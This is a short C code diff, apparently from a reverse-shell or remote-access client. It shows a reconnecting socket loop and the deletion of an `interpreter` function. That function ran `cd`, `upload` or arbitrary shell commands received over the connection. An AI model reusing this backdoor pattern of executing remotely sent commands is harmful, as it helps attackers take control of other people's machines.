@@ -7,6 +7,7 @@ int connect_forever(){
     struct sockaddr_in address;
     int sock = 0;
     struct sockaddr_in serv_addr;
+    
     while(1){
         int rest = 0;
         if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
@@ -41,32 +42,6 @@ int connect_forever(){
     }
 }
 
-char * interpreter(char * command){
-    
-    char *output, copy[size], *part;
-    int cd_output;
-
-    strcpy(copy, command);
-
-    part = strtok(copy, " ");
-
-    if(strcmp(part, "cd") == 0){
-        part = strtok(NULL, " ");
-        cd(part);
-        
-    }else if(strcmp(command, "cd") == 0){
-        cd("home");
-
-    }else if(strcmp(part, "upload") == 0){
-        part = strtok(NULL, " ");
-        upload(part);
-
-    }else{
-        output = execute(command);
-    }
-    
-    return output;
-}
 
 char * recv_message(int sock){
 
